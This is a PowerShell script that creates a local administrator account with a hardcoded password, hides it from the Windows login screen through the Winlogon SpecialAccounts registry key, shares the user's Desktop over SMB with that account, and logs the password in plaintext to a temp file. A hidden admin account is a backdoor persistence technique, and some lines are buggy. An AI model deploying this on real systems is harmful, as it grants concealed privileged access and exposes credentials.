#########################
#     SHARE DESKTOP     #
#########################

# Create Log File
$LOG_FILE = "C:\Windows\Temp\desktop.log"

try{


    # Create New User
        # create local admin user account
    $userName = "tempUser" # Set this to any username.
    $passwordString = "Password1!Password1!" # Set this to any password.

    $passWord = ConvertTo-SecureString $passwordString -AsPlainText -Force
    $fullName = "temp user"
    $description = "temp user"
    New-LocalUser -Name $userName -Password $passWord -FullName $fullName -Description $description
    Add-LocalGroupMember -Group "Administrators" -Member $userName


    # Create Registry Key to hide user account on login screen
    $regName = "$($userName)"
    $regValue = "0"

    if (Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'){
        if (Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts'){
            "SpecialAccounts Exists" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
            " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
        } else {
            New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SpecialAccounts"
            "SpecialAccounts Does NOT Exist. Creating New Key..." | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
            "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
            if (Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'){
                "UserList Exists" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
            } else {
                New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name "UserList"
                "UserList Does NOT Exist. Creating New Key..." | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                if (Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\tempUser'){
                    "tempUser key exists. continue..." | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                    " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                } else {
                    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $regName -Value $regValue -PropertyType DWORD -Force
                    "$($regName) key created." | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\tempUser" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                    " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                    "Proceeding with creating share drive." | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                    " " | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
                }
            }
        }
    } else {
        "$($_.Exception.Message)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
    }
    

    # Create SMB share
    try {
        $shareName = "Desktop"
        #$getDomain = (Get-WmiObject Win32_ComputerSystem).Domain
        #$getUser = "$getDomain\$userName"
        New-SmbShare -Name $shareName -Path "C:\Users\$env:USERNAME\Desktop" -FullAccess $userName
    } catch {
        "$($_.Exception.Message)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
    }


    # Return Share Drive Path
    try {
        $getSharePath = (Get-WmiObject Win32_Share -filter "Name LIKE 'Desktop'").path
        $getSharePath = -replace "C:\"
        $getHost = (Get-WmiObject Win32_ComputerSystem).Name
        $getIP = (Test-Connection -ComputerName $getHost -Count 1).IPV4Address.IPAddressToString
        $sharePath = "\\$($getIP)\$($getSharePath)"
        $sharePath = $sharePath.Replace("C:\","")
    } catch {
        "$($_.Exception.Message)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
    }


    # Write to log file
    "Share Drive Location: $($sharePath)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
    "User Name: $($userName)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
    "Password: $($passwordString)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
} catch {
    "$($_.Exception.Message)" | Out-File -FilePath $LOG_FILE -Append -Force -Encoding ascii
}